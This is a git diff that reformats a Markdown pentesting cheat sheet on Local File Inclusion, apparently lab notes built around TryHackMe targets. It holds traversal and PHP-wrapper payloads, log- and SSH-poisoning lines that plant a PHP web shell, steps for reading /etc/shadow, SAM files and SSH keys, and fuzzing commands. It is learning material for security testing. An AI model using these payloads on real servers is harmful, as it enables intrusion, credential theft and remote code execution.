@@ -1,32 +1,38 @@
-## LFI Local File Inclusion
-### Table of Contents
-- [LFI Local File Inclusion](#lfi-local-file-inclusion)
-  * [Table of Contents](#table-of-contents)
-  * [Introduction](#introduction)
-    + [Example:](#example-)
-  * [Directory Traversal](#directory-traversal)
-    + [Basic Linux Test](#basic-linux-test)
-  * [PHP Wrappers](#php-wrappers)
-    + [PHP Expect Wrapper](#php-expect-wrapper)
-    + [PHP Filter Wrapper](#php-filter-wrapper)
-  * [RCE via SSH](#rce-via-ssh)
-  * [RCE via Apache logs](#rce-via-apache-logs)
-  * [LFI to RCE via credentials files](#lfi-to-rce-via-credentials-files)
-    + [Windows version](#windows-version)
-    + [Linux version](#linux-version)
-  * [Automated LFI with Wfuzz](#automated-lfi-with-wfuzz)
-  * [Resources](#resources)
-- [Requests to look out for](#requests-to-look-out-for)
-  * [Fuzzing for subdomains](#fuzzing-for-subdomains)
-  * [Files to grab if you get LFI](#files-to-grab-if-you-get-lfi)
+# LFI
 
-### Introduction
-- An attacker can use Local File Inclusion (LFI) to trick the web application into exposing or running files on the web server.
-- LFI occurs when an application uses the path to a file as input. If the application treats this input as trusted, a local file may be used in the include statement.
-- ![lfi](https://user-images.githubusercontent.com/75596877/138767265-ed9d8d7f-38f2-43cf-9622-8d4890f0664e.png)
+### LFI Local File Inclusion
 
-#### Example:
-````
+#### Table of Contents
+
+* [LFI Local File Inclusion](LFI.md#lfi-local-file-inclusion)
+  * [Table of Contents](LFI.md#table-of-contents)
+  * [Introduction](LFI.md#introduction)
+    * [Example:](LFI.md#example-)
+  * [Directory Traversal](LFI.md#directory-traversal)
+    * [Basic Linux Test](LFI.md#basic-linux-test)
+  * [PHP Wrappers](LFI.md#php-wrappers)
+    * [PHP Expect Wrapper](LFI.md#php-expect-wrapper)
+    * [PHP Filter Wrapper](LFI.md#php-filter-wrapper)
+  * [RCE via SSH](LFI.md#rce-via-ssh)
+  * [RCE via Apache logs](LFI.md#rce-via-apache-logs)
+  * [LFI to RCE via credentials files](LFI.md#lfi-to-rce-via-credentials-files)
+    * [Windows version](LFI.md#windows-version)
+    * [Linux version](LFI.md#linux-version)
+  * [Automated LFI with Wfuzz](LFI.md#automated-lfi-with-wfuzz)
+  * [Resources](LFI.md#resources)
+* [Requests to look out for](LFI.md#requests-to-look-out-for)
+  * [Fuzzing for subdomains](LFI.md#fuzzing-for-subdomains)
+  * [Files to grab if you get LFI](LFI.md#files-to-grab-if-you-get-lfi)
+
+#### Introduction
+
+* An attacker can use Local File Inclusion (LFI) to trick the web application into exposing or running files on the web server.
+* LFI occurs when an application uses the path to a file as input. If the application treats this input as trusted, a local file may be used in the include statement.
+* ![lfi](https://user-images.githubusercontent.com/75596877/138767265-ed9d8d7f-38f2-43cf-9622-8d4890f0664e.png)
+
+**Example:**
+
+```
 /**
 * Get the filename from a GET input
 * Example - http://example.com/?file=filename.php
@@ -38,148 +44,206 @@ $file = $_GET['file'];
 * Example - filename.php
 */
 include('directory/' . $file);
-````
-- In the above example, an attacker could make the following request. It tricks the application into executing a PHP script such as a web shell that the attacker managed to upload to the web server.
-````
+```
+
+* In the above example, an attacker could make the following request. It tricks the application into executing a PHP script such as a web shell that the attacker managed to upload to the web server.
+
+```
 http://example.com/?file=../../uploads/evil.php
-````
-### Directory Traversal
-- Even without the ability to upload and execute code, a Local File Inclusion vulnerability can be dangerous. 
-- An attacker can still perform a Directory Traversal / Path Traversal attack using an LFI vulnerability as follows.
-````
+```
+
+#### Directory Traversal
+
+* Even without the ability to upload and execute code, a Local File Inclusion vulnerability can be dangerous.
+* An attacker can still perform a Directory Traversal / Path Traversal attack using an LFI vulnerability as follows.
+
+```
 http://example.com/?file=../../../../etc/passwd
-````
-- Testing 
-- If you see a webpage URL look like this:
-````
+```
+
+* Testing
+* If you see a webpage URL look like this:
+
+```
 /script.php?page=index.html 
-````
-#### Basic Linux Test
+```
+
+**Basic Linux Test**
+
 Test for:
-````
+
+```
 http://example.thm.labs/page.php?file=/etc/passwd 
 http://example.thm.labs/page.php?file=../../../../../../etc/passwd 
 http://example.thm.labs/page.php?file=../../../../../../etc/passwd%00 
 http://example.thm.labs/page.php?file=....//....//....//....//etc/passwd 
 http://example.thm.labs/page.php?file=%252e%252e%252fetc%252fpasswd
-````
-### PHP Wrappers
-- PHP has a number of wrappers that can often be abused to bypass various input filters.
-#### PHP Expect Wrapper
-- `PHP expect://` allows execution of system commands, unfortunately the expect PHP module is not enabled by default
-````
+```
+
+#### PHP Wrappers
+
+* PHP has a number of wrappers that can often be abused to bypass various input filters.
+
+**PHP Expect Wrapper**
+
+* `PHP expect://` allows execution of system commands, unfortunately the expect PHP module is not enabled by default
+
+```
 php?page=expect://ls
-````
-#### PHP Filter Wrapper
+```
+
+**PHP Filter Wrapper**
+
 `php://filter` allows a pen tester to include local files and base64 encodes the output. Therefore, any base64 output will need to be decoded to reveal the contents.
-````
+
+```
 http://example.thm.labs/page.php?file=php://filter/resource=/etc/passwd
 http://example.thm.labs/page.php?file=php://filter/read=string.rot13/resource=/etc/passwd 
 http://example.thm.labs/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
-````
-- First one will often fail because it attempts to execute the php code, thus converting to ROT13 or base64 will help achieve LFI
-### LFI to RCE via Log Posioning
-- First find the log file path and attempt to `curl` to it 
-````
+```
+
+* First one will often fail because it attempts to execute the php code, thus converting to ROT13 or base64 will help achieve LFI
+
+#### LFI to RCE via Log Posioning
+
+* First find the log file path and attempt to `curl` to it
+
+```
 user@machine$ curl -A "This is testing" http://10-10-122-235.p.thmlabs.com/login.php
-````
-- Should see the evidence of your test in the user agent string logged
-- ![1](https://user-images.githubusercontent.com/75596877/145140973-2ab102e2-f40d-4f16-8a0b-a3582f002d46.png)
-- Now post php code to the log file and then visit the log file location to execute the php code you just injected
-````
+```
+
+* Should see the evidence of your test in the user agent string logged
+* ![1](https://user-images.githubusercontent.com/75596877/145140973-2ab102e2-f40d-4f16-8a0b-a3582f002d46.png)
+* Now post php code to the log file and then visit the log file location to execute the php code you just injected
+
+```
 user@machine$ curl -A "<?php phpinfo();?>" http://10-10-122-235.p.thmlabs.com/login.php
-````
-#### LFI to RCE via PHP Sessions
+```
 
-- The LFI to RCE via PHP sessions follows the same concept of the log poisoning technique. 
-- PHP sessions are files within the operating system that store temporary information. After the user logs out of the web application, the PHP session information will be deleted.
+**LFI to RCE via PHP Sessions**
 
-- This technique requires enumeration to read the PHP configuration file first, and then we know where the PHP sessions files are. 
-- Then, we include a PHP code into the session and finally call the file via LFI. 
-- PHP stores session data in files within the system in different locations based on the configuration. The following are some of the common locations that the PHP stores in:
-````
+* The LFI to RCE via PHP sessions follows the same concept of the log poisoning technique.
+* PHP sessions are files within the operating system that store temporary information. After the user logs out of the web application, the PHP session information will be deleted.
+* This technique requires enumeration to read the PHP configuration file first, and then we know where the PHP sessions files are.
+* Then, we include a PHP code into the session and finally call the file via LFI.
+* PHP stores session data in files within the system in different locations based on the configuration. The following are some of the common locations that the PHP stores in:
+
+```
 c:\Windows\Temp
 /tmp/
 /var/lib/php5
 /var/lib/php/session
-````
-- Once the attacker finds where PHP stores the session file and can control the value of their session, the attacker can use it to a chain exploit with an LFI to gain remote command execution.
-- To find the PHP session file name, PHP, by default uses the following naming scheme, `sess_<SESSION_ID>` where we can find the `SESSION_ID` using the browser and verifying cookies sent from the server.
+```
 
-- To find the session ID in the browser, you can open the developer tools `(SHIFT+CTRL+I)`, then the Application tab. 
-- From the left menu, select Cookies and select the target website. 
-- There is a `PHPSESSID`  and the value. In my case, the value is `vc4567al6pq7usm2cufmilkm45`. 
-- Therefore, the file will be as `sess_vc4567al6pq7usm2cufmilkm45`. Finally, we know it is stored in `/tmp`. 
-- Now we can use the LFI to call the session file.
-````
+* Once the attacker finds where PHP stores the session file and can control the value of their session, the attacker can use it to a chain exploit with an LFI to gain remote command execution.
+* To find the PHP session file name, PHP, by default uses the following naming scheme, `sess_<SESSION_ID>` where we can find the `SESSION_ID` using the browser and verifying cookies sent from the server.
+* To find the session ID in the browser, you can open the developer tools `(SHIFT+CTRL+I)`, then the Application tab.
+* From the left menu, select Cookies and select the target website.
+* There is a `PHPSESSID` and the value. In my case, the value is `vc4567al6pq7usm2cufmilkm45`.
+* Therefore, the file will be as `sess_vc4567al6pq7usm2cufmilkm45`. Finally, we know it is stored in `/tmp`.
+* Now we can use the LFI to call the session file.
+
+```
 https://10-10-122-235.p.thmlabs.com/login.php?err=/tmp/sess_vc4567al6pq7usm2cufmilkm45
-````
+```
 
-### RCE via SSH
-- Try to ssh into the box with a PHP code as username <?php system($_GET["cmd"]);?>.
-````
+#### RCE via SSH
+
+* Try to ssh into the box with a PHP code as username .
+
+```
 ssh <?php system($_GET["cmd"]);?>@10.10.10.10
-````
-- Then include the SSH log files inside the Web Application.
-````
+```
+
+* Then include the SSH log files inside the Web Application.
+
+```
 http://example.com/index.php?page=/var/log/auth.log&cmd=id
-````
-### RCE via Apache logs
-- Poison the User-Agent in access logs:
-````
+```
+
+#### RCE via Apache logs
+
+* Poison the User-Agent in access logs:
+
+```
 curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
-````
-- Note: The logs will escape double quotes so use single quotes for strings in the PHP payload.
-- Then request the logs via the LFI and execute your command.
-````
+```
+
+* Note: The logs will escape double quotes so use single quotes for strings in the PHP payload.
+* Then request the logs via the LFI and execute your command.
+
+```
 curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
-````
-### LFI to RCE via credentials files
-- This method require high privileges inside the application in order to read the sensitive files.
-#### Windows version
-- First extract sam and system files.
-````
+```
+
+#### LFI to RCE via credentials files
+
+* This method require high privileges inside the application in order to read the sensitive files.
+
+**Windows version**
+
+* First extract sam and system files.
+
+```
 http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
 http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
-````
-- Then extract hashes from these files samdump2 SYSTEM SAM > hashes.txt, and crack them with hashcat/john or replay them using the Pass The Hash technique.
-#### Linux version
-- First extract /etc/shadow files.
-````
+```
+
+* Then extract hashes from these files samdump2 SYSTEM SAM > hashes.txt, and crack them with hashcat/john or replay them using the Pass The Hash technique.
+
+**Linux version**
+
+* First extract /etc/shadow files.
+
+```
 http://example.com/index.php?page=../../../../../../etc/shadow
-````
-- Then crack the hashes inside in order to login via SSH on the machine.
-- Another way to gain SSH access to a Linux machine through LFI is by reading the private key file, id_rsa. 
-- If SSH is active check which user is being used `/proc/self/status` and `/etc/passwd` and try to access `/<HOME>/.ssh/id_rsa`.
-### Automated LFI with Wfuzz
-- Automate LFI Tests
-- Download the `traversal.txt` file in this folder (from PayloadAllTheThings)
-- Test with `wfuzz`
-````
+```
+
+* Then crack the hashes inside in order to login via SSH on the machine.
+* Another way to gain SSH access to a Linux machine through LFI is by reading the private key file, id\_rsa.
+* If SSH is active check which user is being used `/proc/self/status` and `/etc/passwd` and try to access `/<HOME>/.ssh/id_rsa`.
+
+#### Automated LFI with Wfuzz
+
+* Automate LFI Tests
+* Download the `traversal.txt` file in this folder (from PayloadAllTheThings)
+* Test with `wfuzz`
+
+```
 wfuzz -u "http://10.10.218.222/article?name=FUZZ" -w traversal.txt | grep 200
-````
-- `grep 200` for the `Ok` status code
-- `w` -> the wordlist
-- `?name=FUZZ` -> the parameter you want to fuzz
-  ### Resources
-- https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/
-- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi-to-rce-via-phpinfo
-## Requests to look out for
-- ![alt text](https://miro.medium.com/max/2400/1*uMZmYUNcqjh4Rht11nGQDw.png)
-- We notice the request with a `?` indicating possible LFI but we are not sure the paramater it wants
-- Attempt to fuzz the parameter for command injection and file inclusion
-- Wordlist to use:
-````
+```
+
+* `grep 200` for the `Ok` status code
+* `w` -> the wordlist
+*   `?name=FUZZ` -> the parameter you want to fuzz
+
+    #### Resources
+* https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/
+* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi-to-rce-via-phpinfo
+
+### Requests to look out for
+
+* ![alt text](https://miro.medium.com/max/2400/1\*uMZmYUNcqjh4Rht11nGQDw.png)
+* We notice the request with a `?` indicating possible LFI but we are not sure the paramater it wants
+* Attempt to fuzz the parameter for command injection and file inclusion
+* Wordlist to use:
+
+```
 traversal.txt
 /usr/share/Seclists/Discovery/Web-Content/burp-parameter-names.txt
-````
-- Use FFuF, or wfuzz
-### Fuzzing for subdomains 
-````
+```
+
+* Use FFuF, or wfuzz
+
+#### Fuzzing for subdomains
+
+```
 ffuf -u http://vulnnet.thm -H "Host: FUZZ.vulnnet.thm" -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fs 5829
-````
-- ### Files to grab if you get LFI
-````
+```
+
+* #### Files to grab if you get LFI
+
+```
 /etc/passwd
 /etc/shadow
 /etc/hosts
@@ -199,20 +263,4 @@ CMS Config Files
 /etc/httpd/conf/httpd.conf
 /usr/local/apache2/apache2.conf
 /var/www/html/.htpasswd
-````
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+```
